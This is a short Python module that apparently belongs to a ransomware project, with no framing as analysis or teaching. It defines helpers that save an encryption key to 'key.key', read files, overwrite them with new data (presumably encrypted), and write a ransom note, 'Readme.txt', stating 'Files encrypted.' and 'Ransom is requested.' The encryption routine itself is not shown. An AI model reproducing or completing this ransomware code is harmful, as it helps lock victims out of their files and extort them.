from main.constants import const as cs

def create_key(key):
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def read_data(item):
    with open(item, "rb") as file:
        file_data = file.read()
    return file_data

def encrypt_data(item, data):
    with open(item, "wb") as file:
        file.write(data)

def decrypt_data(item, data):
    with open(item, "wb") as file:
        file.write(data)

def create_ransom_readme():
    with open(cs.PATH_ENC+"Readme.txt", "w") as file:
        file.write("Files encrypted.")
        file.write(cs.JUMP_LINE)
        file.write("Ransom is requested.")